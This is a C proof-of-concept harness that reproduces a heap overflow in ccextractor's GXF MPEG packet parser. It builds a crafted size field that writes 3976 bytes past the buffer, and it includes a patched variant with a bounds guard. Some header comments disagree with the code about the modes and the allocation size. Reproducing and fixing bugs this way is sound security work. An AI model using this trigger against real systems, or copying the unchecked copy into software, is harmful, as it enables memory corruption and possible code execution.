/*
 * ccextractor2shell frontier harness.
 *
 * Vulnerability: src/lib_ccx/ccx_gxf.c parse_mpeg_packet() writes `len`
 * bytes at data->buffer + data->len with no check against BUFSIZE; `len`
 * is the media packet's mpeg_pic_size (24 attacker-controlled bits).
 * data->buffer is malloc(BUFSIZE), BUFSIZE = 2 MiB + 120 (ONEPASS).
 *
 * Modes:
 *   vuln    build the verbatim pinned function (no guard)
 *   fixed   same function plus a bounds guard reproducing the proposed
 *           upstream fix ("skip the packet when data->len + len > BUFSIZE")
 *   safe    verbatim function with a small, in-bounds mpeg_pic_size
 *
 * ASan builds allocate exactly BUFSIZE so the store is an observed heap
 * overflow. Plain builds allocate BUFSIZE + 64 with a canary so chosen
 * bytes past the nominal BUFSIZE can be read back without heap corruption.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CCX_OK 0
#define CCX_EOF 1
#define ONEPASS 120
#define BUFSIZE (2048 * 1024 + ONEPASS)
#define TRACK_TYPE_MPEG2_525 5

struct demuxer_data
{
	unsigned char *buffer;
	size_t len;
};
struct ccx_demuxer
{
	size_t past;
	unsigned char *input;
	size_t input_len;
	size_t pos;
};

static void fatal(const char *msg)
{
	fprintf(stderr, "FATAL: %s\n", msg);
	exit(2);
}

/* Wire-borne source: a GXF MEDIA packet's first four payload bytes,
 * interpreted exactly as ccx_gxf.c:1148-1150 does. */
static uint32_t buffered_get_be32(struct ccx_demuxer *demux)
{
	if (demux->pos + 4 > demux->input_len)
		fatal("short media packet header");
	const unsigned char *p = demux->input + demux->pos;
	uint32_t v = ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
		     ((uint32_t)p[2] << 8) | (uint32_t)p[3];
	demux->pos += 4;
	return v;
}

/* Stand-in for buffered_read/buffered_read_opt: copies exactly `len`
 * attacker-supplied wire bytes into the destination. The real code path
 * (file_functions.c:376) uses read(2) into the same destination. */
static int buffered_read(struct ccx_demuxer *demux, unsigned char *dst, int len)
{
	if (len < 0)
		fatal("negative read length");
	if (demux->pos + (size_t)len > demux->input_len)
		fatal("short media payload");
	memcpy(dst, demux->input + demux->pos, (size_t)len);
	demux->pos += (size_t)len;
	return len;
}

#ifdef FIXED_BUILD
/* Proposed fix: do not read a packet that cannot fit. UNKNOWN upstream PR
 * as of 2026-11-24; this hunk is local, not claimed as a vendor patch. */
static int parse_mpeg_packet(struct ccx_demuxer *demux, int len, struct demuxer_data *data)
{
	int ret = CCX_OK;
	int result = 0;

	if (data->len + (size_t)len > BUFSIZE)
		return CCX_EOF;

	result = buffered_read(demux, data->buffer + data->len, len);
	data->len += len;
	demux->past += result;
	if (result != len)
		ret = CCX_EOF;
	return ret;
}
#else
#include "parse_mpeg_packet.inc"
#endif

int main(int argc, char **argv)
{
	if (argc != 2)
		fatal("usage: harness <attack|safe>");
	int attack = strcmp(argv[1], "attack") == 0;
	if (!attack && strcmp(argv[1], "safe") != 0)
		fatal("mode must be attack or safe");

	/* 4-byte mpeg_pic_size field, as in ccx_gxf.c:1148-1150.
	 * Attack: 0x00201000 = 2101248, 3976 bytes beyond BUFSIZE (2097272).
	 * Safe:   0x00001000 = 4096, in bounds. */
	static const unsigned char hdr_attack[4] = { 0x00, 0x20, 0x10, 0x00 };
	static const unsigned char hdr_safe[4] = { 0x00, 0x00, 0x10, 0x00 };
	const unsigned char *header = attack ? hdr_attack : hdr_safe;
	static const char pattern[] = "MISHE-CCEX";
	const size_t patlen = sizeof(pattern) - 1;

	struct ccx_demuxer demux;
	memset(&demux, 0, sizeof(demux));
	uint32_t wire = ((uint32_t)header[0] << 24) | ((uint32_t)header[1] << 16) |
			((uint32_t)header[2] << 8) | (uint32_t)header[3];
	int mpeg_pic_size = (int)(wire & 0xFFFFFF); /* verbatim mask */
	if (mpeg_pic_size <= 0)
		fatal("bad derived size");
	const size_t payload_len = (size_t)mpeg_pic_size;
	unsigned char *input = malloc(4 + payload_len);
	if (!input)
		fatal("input allocation");
	memcpy(input, header, 4);
	for (size_t i = 0; i < payload_len; i++)
		input[4 + i] = (unsigned char)pattern[i % patlen];
	demux.input = input;
	demux.input_len = 4 + payload_len;

#ifdef ASAN_BUILD
	/* Exact allocation: an OOB store is reported by ASan. */
	size_t alloc = BUFSIZE;
#else
	/* Canary layout: slack absorbs the 3976-byte overflow so chosen bytes
	 * at BUFSIZE remain readable; canary sits past the write end. */
	size_t alloc = BUFSIZE + 8192;
#endif

	struct demuxer_data data;
	memset(&data, 0, sizeof(data));
	data.buffer = malloc(alloc);
	if (!data.buffer)
		fatal("buffer allocation");
#ifndef ASAN_BUILD
	memset(data.buffer + BUFSIZE + 4000, 0xCC, 64);
#endif

	/* Re-derive from the wire buffer using the same helper the pinned
	 * caller uses, so the length is not supplied by the test driver. */
	demux.pos = 0;
	uint32_t derived = buffered_get_be32(&demux);
	if (derived != wire)
		fatal("wire derivation mismatch");

	int ret = parse_mpeg_packet(&demux, mpeg_pic_size, &data);
	printf("mode=%s derived_len=%d BUFSIZE=%d alloc=%zu ret=%d past=%zu\n",
	       attack ? "attack" : "safe", mpeg_pic_size, BUFSIZE, alloc,
	       ret, demux.past);
#ifndef ASAN_BUILD
	printf("canary_at_BUFSIZE=");
	for (size_t i = 0; i < 16; i++)
		printf("%02x", data.buffer[BUFSIZE + i]);
	printf("\n");
	printf("expected=");
	for (size_t i = 0; i < 16; i++)
		printf("%02x", (unsigned char)pattern[(BUFSIZE + i) % patlen]);
	printf("\n");
#endif
	free(data.buffer);
	free(input);
	return 0;
}
